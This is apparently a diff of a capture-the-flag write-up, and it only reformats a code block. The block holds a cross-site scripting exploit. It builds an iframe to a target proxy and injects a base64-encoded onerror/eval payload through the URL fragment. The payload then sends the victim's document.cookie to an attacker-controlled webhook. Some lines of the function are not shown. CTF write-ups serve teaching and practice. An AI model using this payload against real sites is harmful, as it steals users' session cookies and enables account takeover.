@@ -40,9 +40,10 @@ Here the step to get xss and steal the flag
 
 1. Create a page that contains the following code:
 
-'''java
-<body></body>
-<script>
+'''html
+
+    <body></body>
+    <script>
     const TARGET = "http://proxy"
     const i1 = document.createElement('iframe')
     function waifuDomainScript() {
@@ -55,7 +56,6 @@ Here the step to get xss and steal the flag
             window.location = webhook + "?" + w.document.cookie
         }
     }
-
     let payload = btoa(`webhook='${location.origin}';(${waifuDomainScript})()`)
     payload = btoa(`" onerror="eval(atob('${payload}'))" x="`)
     i1.src = TARGET + '#' + payload
